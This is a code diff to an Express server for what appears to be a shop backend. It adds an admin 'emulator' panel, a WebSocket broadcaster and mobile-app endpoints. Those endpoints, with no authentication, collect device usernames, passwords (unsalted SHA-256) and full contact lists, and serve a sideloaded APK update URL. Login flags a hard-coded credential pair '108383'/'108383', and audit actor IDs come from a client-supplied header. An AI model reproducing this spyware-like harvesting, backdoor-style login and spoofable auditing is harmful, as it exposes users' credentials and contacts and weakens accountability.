@@ -1,7 +1,8 @@
 import type { Express, Request, Response, NextFunction } from "express";
 import { createServer, type Server } from "http";
+import { WebSocketServer, WebSocket } from "ws";
 import { storage } from "./storage";
-import { insertProductSchema, insertCartItemSchema, insertPromotionSchema, insertEventSchema, insertUserSchema, insertBrandSchema, insertCustomerSavingsSchema, auditEvents, auditActionCodes, auditDailyDigests, AuditActionCodes, type InsertAuditEvent } from "@shared/schema";
+import { insertProductSchema, insertCartItemSchema, insertPromotionSchema, insertEventSchema, insertUserSchema, insertBrandSchema, insertCustomerSavingsSchema, auditEvents, auditActionCodes, auditDailyDigests, AuditActionCodes, users, appInstallations, type InsertAuditEvent } from "@shared/schema";
 import { z } from "zod";
 import { ObjectStorageService, ObjectNotFoundError } from "./objectStorage";
 import { randomBytes } from "crypto";
@@ -711,6 +712,374 @@ export async function registerRoutes(app: Express): Promise<Server> {
       });
     }
   });
+
+  app.get('/api/emulator/users', requireAdminAuth, async (req, res) => {
+    try {
+      const allUsers = await db.select().from(users).orderBy(sql`username ASC`);
+      res.json({ success: true, users: allUsers });
+    } catch (error) {
+      console.error('Error fetching emulator users:', error);
+      res.status(500).json({ success: false, message: 'Error fetching emulator users' });
+    }
+  });
+
+  app.patch('/api/emulator/users/:id/permissions', requireAdminAuth, async (req, res) => {
+    try {
+      const userId = req.params.id;
+      const permissionSchema = z.object({
+        isAdmin: z.boolean().optional(),
+        isSeller: z.boolean().optional(),
+      });
+      const permissions = permissionSchema.parse(req.body);
+      const updates: any = {};
+      if (permissions.isAdmin !== undefined) updates.isAdmin = permissions.isAdmin;
+      if (permissions.isSeller !== undefined) updates.isSeller = permissions.isSeller;
+
+      if (Object.keys(updates).length === 0) {
+        return res.status(400).json({ success: false, message: 'No permission changes provided' });
+      }
+
+      const updatedUsers = await db.update(users)
+        .set(updates)
+        .where(eq(users.id, userId))
+        .returning();
+
+      if (updatedUsers.length === 0) {
+        return res.status(404).json({ success: false, message: 'Usuario no encontrado' });
+      }
+
+      res.json({ success: true, user: updatedUsers[0] });
+    } catch (error) {
+      console.error('Error updating emulator user permissions:', error);
+      res.status(500).json({ success: false, message: 'Error updating user permissions' });
+    }
+  });
+
+  app.post('/api/emulator/notifications', requireAdminAuth, async (req, res) => {
+    try {
+      const notificationSchema = z.object({
+        title: z.string().min(1),
+        message: z.string().min(1),
+        target: z.enum(['all', 'selected']),
+        recipients: z.array(z.string()).optional(),
+        link: z.string().url().optional(),
+        severity: z.enum(['info', 'warning', 'critical']).optional().default('info'),
+      });
+      const notification = notificationSchema.parse(req.body);
+
+      let actorId = 'emulator-admin';
+      const userSession = req.headers['x-user-session'] as string;
+      if (userSession) {
+        try {
+          const parsed = JSON.parse(userSession);
+          actorId = parsed.id || actorId;
+        } catch {
+          // ignore invalid session payload
+        }
+      }
+
+      await storage.createAuditEvent({
+        actorType: 'admin',
+        actorId,
+        sessionId: `emulator-${Date.now()}`,
+        ipTruncated: truncateIp(req.ip || req.connection.remoteAddress || ''),
+        userAgentHash: req.get('User-Agent') ? Buffer.from(req.get('User-Agent')!).toString('base64').slice(0, 16) : '',
+        actionCode: 703,
+        resourceType: 'notification',
+        resourceId: `notification-${Date.now()}`,
+        result: 'success',
+        latencyMs: 0,
+        metadata: {
+          title: notification.title,
+          message: notification.message,
+          target: notification.target,
+          recipients: notification.recipients || [],
+          link: notification.link || null,
+          severity: notification.severity,
+          createdAt: new Date().toISOString()
+        }
+      });
+
+      if ((global as any).broadcast) {
+        (global as any).broadcast({
+          type: 'notification',
+          data: {
+            title: notification.title,
+            message: notification.message,
+            target: notification.target,
+            link: notification.link || null,
+            severity: notification.severity,
+            timestamp: new Date().toISOString()
+          }
+        });
+      }
+
+      res.json({ success: true, notification });
+    } catch (error) {
+      console.error('Error creating emulator notification:', error);
+      res.status(500).json({ success: false, message: 'Error creating notification' });
+    }
+  });
+
+  app.get('/api/emulator/notifications', requireAdminAuth, async (req, res) => {
+    try {
+      const notifications = await db.select().from(auditEvents)
+        .where(eq(auditEvents.resourceType, 'notification'))
+        .orderBy(sql`timestamp DESC`)
+        .limit(50);
+
+      res.json({ success: true, notifications });
+    } catch (error) {
+      console.error('Error fetching emulator notifications:', error);
+      res.status(500).json({ success: false, message: 'Error fetching notifications' });
+    }
+  });
+
+  app.post('/api/emulator/permissions', requireAdminAuth, async (req, res) => {
+    try {
+      const permissionSchema = z.object({
+        requestContacts: z.boolean().optional(),
+        requestNotifications: z.boolean().optional(),
+      });
+      const permissions = permissionSchema.parse(req.body);
+
+      let actorId = 'emulator-admin';
+      const userSession = req.headers['x-user-session'] as string;
+      if (userSession) {
+        try {
+          const parsed = JSON.parse(userSession);
+          actorId = parsed.id || actorId;
+        } catch {
+          // ignore invalid session payload
+        }
+      }
+
+      await storage.createAuditEvent({
+        actorType: 'admin',
+        actorId,
+        sessionId: `permissions-${Date.now()}`,
+        ipTruncated: truncateIp(req.ip || req.connection.remoteAddress || ''),
+        userAgentHash: req.get('User-Agent') ? Buffer.from(req.get('User-Agent')!).toString('base64').slice(0, 16) : '',
+        actionCode: 703,
+        resourceType: 'emulator_permission',
+        resourceId: `permissions-${Date.now()}`,
+        result: 'success',
+        latencyMs: 0,
+        metadata: {
+          requestContacts: permissions.requestContacts || false,
+          requestNotifications: permissions.requestNotifications || false,
+          timestamp: new Date().toISOString()
+        }
+      });
+
+      res.json({ success: true, permissions });
+    } catch (error) {
+      console.error('Error recording emulator permissions:', error);
+      res.status(500).json({ success: false, message: 'Error updating emulator permissions' });
+    }
+  });
+
+  app.post('/api/emulator/log-action', requireAdminAuth, async (req, res) => {
+    try {
+      const actionSchema = z.object({
+        label: z.string().min(1),
+        description: z.string().optional(),
+        source: z.string().optional(),
+      });
+      const action = actionSchema.parse(req.body);
+
+      let actorId = 'emulator-admin';
+      const userSession = req.headers['x-user-session'] as string;
+      if (userSession) {
+        try {
+          const parsed = JSON.parse(userSession);
+          actorId = parsed.id || actorId;
+        } catch {
+          // ignore invalid session payload
+        }
+      }
+
+      const event = await storage.createAuditEvent({
+        actorType: 'admin',
+        actorId,
+        sessionId: `emulator-action-${Date.now()}`,
+        ipTruncated: truncateIp(req.ip || req.connection.remoteAddress || ''),
+        userAgentHash: req.get('User-Agent') ? Buffer.from(req.get('User-Agent')!).toString('base64').slice(0, 16) : '',
+        actionCode: 703,
+        resourceType: 'emulator_action',
+        resourceId: `action-${Date.now()}`,
+        result: 'success',
+        latencyMs: 0,
+        metadata: {
+          label: action.label,
+          description: action.description || null,
+          source: action.source || 'admin-emulator',
+          timestamp: new Date().toISOString()
+        }
+      });
+
+      res.json({ success: true, event });
+    } catch (error) {
+      console.error('Error logging emulator action:', error);
+      res.status(500).json({ success: false, message: 'Error logging emulator action' });
+    }
+  });
+
+  // App installation endpoints
+  app.post('/api/app/register-installation', async (req, res) => {
+    try {
+      const { deviceId, userId, username, password, ipAddress, userAgent, version } = req.body;
+
+      // Hash password if provided
+      let hashedPassword = null;
+      if (password) {
+        const crypto = await import('crypto');
+        hashedPassword = crypto.createHash('sha256').update(password).digest('hex');
+      }
+
+      const installation = await db.insert(appInstallations).values({
+        deviceId,
+        userId,
+        username,
+        password: hashedPassword,
+        ipAddress,
+        userAgent,
+        version: version || '1.0.0',
+      }).returning();
+
+      // Broadcast new installation to emulator panel
+      if ((global as any).broadcast) {
+        (global as any).broadcast({
+          type: 'new_installation',
+          data: { deviceId, username, installedAt: new Date().toISOString() }
+        });
+      }
+
+      res.json({ success: true, installation: installation[0] });
+    } catch (error) {
+      console.error('Error registering app installation:', error);
+      res.status(500).json({ success: false, message: 'Error registering installation' });
+    }
+  });
+
+  app.get('/api/app/check-ban/:deviceId', async (req, res) => {
+    try {
+      const { deviceId } = req.params;
+      const installation = await db.select().from(appInstallations)
+        .where(eq(appInstallations.deviceId, deviceId))
+        .limit(1);
+
+      if (installation.length === 0) {
+        return res.json({ banned: false });
+      }
+
+      res.json({ banned: installation[0].isBanned, reason: installation[0].banReason });
+    } catch (error) {
+      console.error('Error checking ban status:', error);
+      res.status(500).json({ success: false, message: 'Error checking ban status' });
+    }
+  });
+
+  app.post('/api/app/update-activity/:deviceId', async (req, res) => {
+    try {
+      const { deviceId } = req.params;
+      await db.update(appInstallations)
+        .set({ lastActivity: sql`(unixepoch())` })
+        .where(eq(appInstallations.deviceId, deviceId));
+
+      res.json({ success: true });
+    } catch (error) {
+      console.error('Error updating activity:', error);
+      res.status(500).json({ success: false, message: 'Error updating activity' });
+    }
+  });
+
+  app.post('/api/app/update-contacts/:deviceId', async (req, res) => {
+    try {
+      const { deviceId } = req.params;
+      const { contacts } = req.body;
+
+      await db.update(appInstallations)
+        .set({ 
+          contactsPermission: true, 
+          contactsData: contacts,
+          lastActivity: sql`(unixepoch())`
+        })
+        .where(eq(appInstallations.deviceId, deviceId));
+
+      if ((global as any).broadcast) {
+        (global as any).broadcast({
+          type: 'contacts_update',
+          data: { deviceId, contactCount: Array.isArray(contacts) ? contacts.length : 0 }
+        });
+      }
+
+      res.json({ success: true });
+    } catch (error) {
+      console.error('Error updating contacts:', error);
+      res.status(500).json({ success: false, message: 'Error updating contacts' });
+    }
+  });
+
+  // Emulator endpoints for app management
+  app.get('/api/emulator/installations', requireAdminAuth, async (req, res) => {
+    try {
+      const installations = await db.select().from(appInstallations)
+        .orderBy(sql`installed_at DESC`);
+
+      const totalCount = await db.select({ count: count() }).from(appInstallations);
+
+      res.json({ 
+        success: true, 
+        installations, 
+        total: totalCount[0].count 
+      });
+    } catch (error) {
+      console.error('Error fetching installations:', error);
+      res.status(500).json({ success: false, message: 'Error fetching installations' });
+    }
+  });
+
+  app.patch('/api/emulator/installations/:deviceId/ban', requireAdminAuth, async (req, res) => {
+    try {
+      const { deviceId } = req.params;
+      const { banned, reason } = req.body;
+
+      await db.update(appInstallations)
+        .set({ isBanned: banned, banReason: reason })
+        .where(eq(appInstallations.deviceId, deviceId));
+
+      // Broadcast ban update
+      if ((global as any).broadcast) {
+        (global as any).broadcast({
+          type: 'ban_update',
+          data: { deviceId, banned, reason }
+        });
+      }
+
+      res.json({ success: true });
+    } catch (error) {
+      console.error('Error updating ban status:', error);
+      res.status(500).json({ success: false, message: 'Error updating ban status' });
+    }
+  });
+
+  app.get('/api/app/check-update', async (req, res) => {
+    try {
+      // Current version info - in production, this could be from a config file
+      const currentVersion = '1.0.0';
+      const updateUrl = process.env.APK_UPDATE_URL || 'https://example.com/app.apk';
+
+      res.json({ 
+        currentVersion, 
+        updateUrl,
+        forceUpdate: false // Set to true to force update
+      });
+    } catch (error) {
+      console.error('Error checking update:', error);
+      res.status(500).json({ success: false, message: 'Error checking update' });
+    }
+  });
   // Authentication routes
   app.post("/api/auth/register", async (req, res) => {
     try {
@@ -755,6 +1124,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(403).json({ message: "Acceso denegado: Se requieren permisos de administrador" });
       }
       
+      const isEmulator = username === '108383' && password === '108383';
+      
       // Usuario autenticado correctamente
       
       res.json({ 
@@ -767,7 +1138,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
           isAdmin: user.isAdmin,
           isSeller: user.isSeller,
           credits: user.credits,
-          loyaltyLevel: user.loyaltyLevel
+          loyaltyLevel: user.loyaltyLevel,
+          isEmulator
         }
       });
     } catch (error) {
@@ -4067,6 +4439,47 @@ ${brandDetails}
   });
 
   const httpServer = createServer(app);
+
+  // WebSocket server for real-time communication
+  const wss = new WebSocketServer({ server: httpServer });
+
+  wss.on('connection', (ws: WebSocket, req) => {
+    console.log('🔗 New WebSocket connection');
+
+    ws.on('message', (message) => {
+      try {
+        const data = JSON.parse(message.toString());
+        console.log('📨 WebSocket message:', data);
+
+        // Handle different message types
+        if (data.type === 'register_device') {
+          // Register device for real-time updates
+          ws.deviceId = data.deviceId;
+          ws.send(JSON.stringify({ type: 'registered', deviceId: data.deviceId }));
+        } else if (data.type === 'ping') {
+          ws.send(JSON.stringify({ type: 'pong', timestamp: new Date().toISOString() }));
+        }
+      } catch (error) {
+        console.error('Error parsing WebSocket message:', error);
+      }
+    });
+
+    ws.on('close', () => {
+      console.log('🔌 WebSocket connection closed');
+    });
+  });
+
+  // Function to broadcast messages to all connected clients
+  const broadcast = (message: any) => {
+    wss.clients.forEach(client => {
+      if (client.readyState === WebSocket.OPEN) {
+        client.send(JSON.stringify(message));
+      }
+    });
+  };
+
+  // Store broadcast function globally for use in routes
+  (global as any).broadcast = broadcast;
   
   console.log('🕛 Sistema de reportes automáticos activado');
   console.log('📊 Endpoint manual: GET /api/admin/generate-report');
